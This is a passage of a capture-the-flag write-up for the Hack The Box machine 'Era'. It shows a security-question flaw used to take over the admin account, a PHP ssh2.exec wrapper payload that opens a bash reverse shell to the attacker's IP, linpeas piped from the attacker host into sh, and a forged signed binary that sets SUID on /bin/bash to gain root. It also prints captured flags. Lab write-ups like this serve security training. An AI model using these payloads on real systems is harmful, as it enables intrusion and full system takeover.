-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
226 Directory send OK.
```

```shell
<--- CUT FOR BREVITY --->
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
<--- CUT FOR BREVITY --->
```

## Foothold

### Privilege Escalation to Admin

After we checked basically every file provided by the `FTP Server` we headed back to the web application and checked the `Update Security Questions` tab. It allowed every user which was able to login, to `update` the `Security Questions` of any other user. Like `admin_ef01cab31aa`.

```shell
admin_ef01cab31aa
```

Therefore we updated the `Security Questions` of `admin_ef01cab31aa` and used the `Log in Using Security Questions` options on the website to `escalate` our `privileges` to `admin_ef01cab31aa`.

![](images/2025-07-26_23-20_80_subdomain_updated_security_questions_admin.png)

![](images/2025-07-26_23-20_80_subdomain_login_admin_security_questions.png)

![](images/2025-07-26_23-21_80_subdomain_admin_dashboard.png)

### Remote Code Execution (RCE) through PHP Wrapper

Now being `admin_ef01cab31aa` was not very useful in the first place but it allowed us to make use of the `BETA Function`.

```php
<--- CUT FOR BREVITY --->
// BETA (Currently only available to the admin) - Showcase file instead of downloading it
        } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

                if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }
<--- CUT FOR BREVITY --->
```

We used the information we gathered on the `FTP Share` of `ssh2` to search for documentation about it.

- [https://www.php.net/manual/en/wrappers.ssh2.php](https://www.php.net/manual/en/wrappers.ssh2.php)

This `PHP Wrapper` offered us four options to play with.

```shell
- ssh2.shell://user:pass@example.com:22/xterm
- ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
- ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14
- ssh2.sftp://user:pass@example.com:22/path/to/filename
```

We prepared a `payload` and `URL Encoded` all necessary characters to append it to `&format=`.

```shell
ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
```

```shell
&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.45%2F9001%200%3E%261%22; HTTP/1.1
```

For the execution we intercepted a request accessing a file as `admin_ef01cab31aa` using `Burp Suite` and modified the first line according to our payload to a `callback` as `yuri`.

```shell
GET /download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.45%2F9001%200%3E%261%22; HTTP/1.1
Host: file.era.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://file.era.htb/download.php?id=54
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=vrjbq7kmla3ajds6q6vg96l79m
Connection: keep-alive


```

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.45] from (UNKNOWN) [10.129.174.224] 43164
bash: cannot set terminal process group (16489): Inappropriate ioctl for device
bash: no job control in this shell
yuri@era:~$ 
```

Before we moved on, we just stabilized our shell since there was no way to login via `SSH` to the box.

```shell
yuri@era:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
yuri@era:~$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

yuri@era:~$ 
yuri@era:~$ export XTERM=xterm
yuri@era:~$
```

## Enumeration (yuri)

The user `yuri` had no special privileges. However we used him to `enumerate` and to have a first quick look at the box.

```shell
yuri@era:~$ id
uid=1001(yuri) gid=1002(yuri) groups=1002(yuri)
```

The content of `/etc/passwd` showed another user called `eric` for which we already had the `Hash` cracked and retrieved his `cleartext password`.

```shell
yuri@era:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
eric:x:1000:1000:eric:/home/eric:/bin/bash
ftp:x:108:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
yuri:x:1001:1002::/home/yuri:/bin/sh
_laurel:x:999:999::/var/log/laurel:/bin/false
```

| Username |
| -------- |
| eric     |

Within `/opt` we found a directory called `AV` owned by `root` and accessible by the group `devs`.

```shell
yuri@era:/opt$ ls -la
total 12
drwxrwxr-x  3 root root 4096 Jul 22 08:42 .
drwxr-xr-x 20 root root 4096 Jul 22 08:41 ..
drwxrwxr--  3 root devs 4096 Jul 22 08:42 AV
```

While checking the available ports nothing stood out. Everything we saw was pretty much expected.

```shell
yuri@era:~$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*          
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*          
tcp   LISTEN 0      128        127.0.0.1:22        0.0.0.0:*          
tcp   LISTEN 0      511             [::]:80           [::]:*          
tcp   LISTEN 0      32                 *:21              *:*
```

We fired up `LinPEAS` to have a summary and a more complete output of `ps -auxf`.

```shell
yuri@era:~$ curl 10.10.16.45/linpeas.sh | sh
```

The output showed a `Cronjob` executing a `Bash Script` called `initiate_monitoring.sh` running as `root` and writing to a file named `status.log`.

```shell
<--- CUT FOR BREVITY --->
root        4097  0.0  0.0   4308  2808 ?        Ss   Jul26   0:00 /usr/sbin/cron -f -P
root       19638  0.0  0.0   7764  4004 ?        S    04:56   0:00  _ /usr/sbin/CRON -f -P
root       19639  0.0  0.0   2892   960 ?        Ss   04:56   0:00      _ /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1
root       19640  0.0  0.0   4784  3244 ?        S    04:56   0:00          _ /bin/bash /root/initiate_monitoring.sh
<--- CUT FOR BREVITY --->
```

## Privilege Escalation to eric

Now it was time to perform another quick `Privilege Escalation` by switching to the user `eric` to grab the `user.txt`.

```shell
yuri@era:~$ su eric
Password: 
eric@era:/home/yuri$
```

```shell
eric@era:~$ ls -la
total 28
drwxr-x--- 5 eric eric 4096 Jul 22 08:42 .
drwxr-xr-x 4 root root 4096 Jul 22 08:42 ..
lrwxrwxrwx 1 root root    9 Jul  2 09:15 .bash_history -> /dev/null
-rw-r--r-- 1 eric eric 3771 Jan  6  2022 .bashrc
drwx------ 2 eric eric 4096 Sep 17  2024 .cache
drwxrwxr-x 3 eric eric 4096 Jul 22 08:42 .local
drwx------ 2 eric eric 4096 Sep 17  2024 .ssh
-rw-r----- 1 root eric   33 Jul 26 19:01 user.txt
```

## user.txt

```shell
eric@era:~$ cat user.txt
79a267a8146365ceca32494d2d7c0439
```

## Enumeration (eric)

As `eric` we were part of the `devs` group and therefore had access to the `AV` directory.

```shell
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

```shell
eric@era:/opt/AV$ ls -la
total 12
drwxrwxr-- 3 root devs 4096 Jul 22 08:42 .
drwxrwxr-x 3 root root 4096 Jul 22 08:42 ..
drwxrwxr-- 2 root devs 4096 Jul 27 05:03 periodic-checks
```

Inside the `periodic-checks` folder we found a binary called `monitor`.

```shell
eric@era:/opt/AV/periodic-checks$ ls -la
total 32
drwxrwxr-- 2 root devs  4096 Jul 27 05:04 .
drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..
-rwxrw---- 1 root devs 16544 Jul 27 05:04 monitor
-rw-rw---- 1 root devs   205 Jul 27 05:04 status.log
```

## Privilege Escalation to root

Now the information came together. The `status.log` file showed if someone tampered with the `monitor` binary by verifying it's signature.

The plan was to create a custom binary then sign it and replace the original file.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Era/files]
└─$ cat monitor.c 
#include <stdlib.h>
#include <sys/stat.h>
int main() {
    chmod("/bin/bash", 04755);
    return 0;
}
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Era/files]
└─$ gcc monitor.c -o monitor -static
```

For `signing` the `binary` we used the `linux-elf-binary-signer` project from `GitHub`.

- [https://github.com/NUAA-WatchDog/linux-elf-binary-signer](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)

We needed to provide the `key.pem` we exfiltrated from the `FTP Server` in order to create a legitimate binary.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Era/files/linux-elf-binary-signer]
└─$ cp ../unzip2/key.pem .
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Era/files/linux-elf-binary-signer]
└─$ ./elf-sign sha256 key.pem key.pem ../monitor       
 --- 64-bit ELF file, version 1 (CURRENT), little endian.
 --- 26 sections detected.
 --- Section 0006 [.text] detected.
 --- Length of section [.text]: 478585
 --- Signature size of [.text]: 458
 --- Writing signature to file: .text_sig
 --- Removing temporary signature file: .text_sig
```

Then we started the process by removing the original binary, downloading our custom file and made it executable.

```shell
eric@era:/opt/AV/periodic-checks$ rm monitor
```

```shell
eric@era:/opt/AV/periodic-checks$ ls
status.log
```

```shell
eric@era:/opt/AV/periodic-checks$ wget http://10.10.16.45/monitor
--2025-07-27 05:45:08--  http://10.10.16.45/monitor
Connecting to 10.10.16.45:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 754802 (737K) [application/octet-stream]
Saving to: ‘monitor’

monitor             100%[===================>] 737.11K  2.86MB/s    in 0.3s    

2025-07-27 05:45:09 (2.86 MB/s) - ‘monitor’ saved [754802/754802]
```

```shell
eric@era:/opt/AV/periodic-checks$ ls
monitor  status.log
```

```shell
eric@era:/opt/AV/periodic-checks$ chmod +x monitor
```

After a few seconds we checked the `status.log` and saw that we got clearance as well as the `SUID Bit` was set on `/bin/bash`.

```shell
eric@era:/opt/AV/periodic-checks$ cat status.log 

[ERROR] Executable not signed. Tampering attempt detected. Skipping.
[SUCCESS] No threats detected.
```

```shell
eric@era:/opt/AV/periodic-checks$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

```shell
eric@era:/opt/AV/periodic-checks$ /bin/bash -p
bash-5.1#
```

## root.txt

```shell
bash-5.1# cat root.txt 
f0c9a3d0dd6c784ef1c3d0c0b64cd945
```
